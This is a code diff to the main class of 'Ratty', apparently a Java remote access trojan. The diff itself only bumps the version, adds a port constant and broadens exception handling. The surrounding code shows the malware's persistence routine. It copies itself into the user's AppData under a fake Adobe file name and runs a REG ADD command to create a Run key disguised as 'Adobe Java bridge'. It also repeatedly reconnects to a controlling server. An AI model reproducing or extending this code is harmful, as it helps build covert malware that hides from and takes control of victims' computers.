@@ -1,9 +1,7 @@
 package de.sogomn.rat;
 
 import java.io.File;
-import java.io.IOException;
 import java.net.URI;
-import java.net.URISyntaxException;
 import java.util.ResourceBundle;
 
 import javax.swing.JDialog;
@@ -27,7 +25,7 @@ import de.sogomn.rat.server.gui.RattyGuiController;
 public final class Ratty {
 	
 	public static final boolean DEBUG = true;
-	public static final String VERSION = "1.8";
+	public static final String VERSION = "1.9";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
 	private static String address;
@@ -35,6 +33,7 @@ public final class Ratty {
 	private static boolean client;
 	
 	private static final int CONNECTION_INTERVAL = 2500;
+	private static final int MAX_PORT = 65535;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
 	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
@@ -85,7 +84,7 @@ public final class Ratty {
 			FileUtils.createFile(STARTUP_FILE_PATH);
 			FileUtils.copyFile(source, destination);
 			Runtime.getRuntime().exec(STARTUP_REGISTRY_COMMAND);
-		} catch (final URISyntaxException | IOException ex) {
+		} catch (final Exception ex) {
 			ex.printStackTrace();
 		}
 	}
@@ -94,12 +93,12 @@ public final class Ratty {
 		try {
 			final int port = Integer.parseInt(input);
 			
-			if (port < 0 || port > 65535) {	//65535 = Max port
+			if (port < 0 || port > MAX_PORT) {
 				return -1;
 			}
 			
 			return port;
-		} catch (final NumberFormatException | NullPointerException ex) {
+		} catch (final Exception ex) {
 			return -1;
 		}
 	}
@@ -111,7 +110,7 @@ public final class Ratty {
 		if (!newClient.isOpen()) {
 			try {
 				Thread.sleep(CONNECTION_INTERVAL);
-			} catch (final InterruptedException ex) {
+			} catch (final Exception ex) {
 				//...
 			} finally {
 				System.gc();
